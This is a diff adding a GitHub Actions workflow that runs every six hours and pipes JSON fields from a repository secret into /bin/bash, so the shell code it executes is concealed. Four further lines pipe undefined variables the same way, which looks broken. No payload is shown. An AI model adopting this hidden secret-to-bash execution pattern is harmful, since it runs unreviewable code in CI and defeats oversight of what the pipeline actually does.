@@ -1,0 +1,23 @@
+name: duiyudajiazuirongyi
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '10 1/6 * * *'
+
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: duiyudajiazuirongyi
+        env:
+          fh36: ${{ secrets.fh36 }}
+        run: |
+          echo $fh36 | jq -r .by1 | /bin/bash
+          echo $n89349 | jq -r .nnb3407 | /bin/bash
+          echo $tvj5 | jq -r .dt8485 | /bin/bash
+          echo $fzi78 | jq -r .de07 | /bin/bash
+          echo $ca3176 | jq -r .lwfp607 | /bin/bash
+
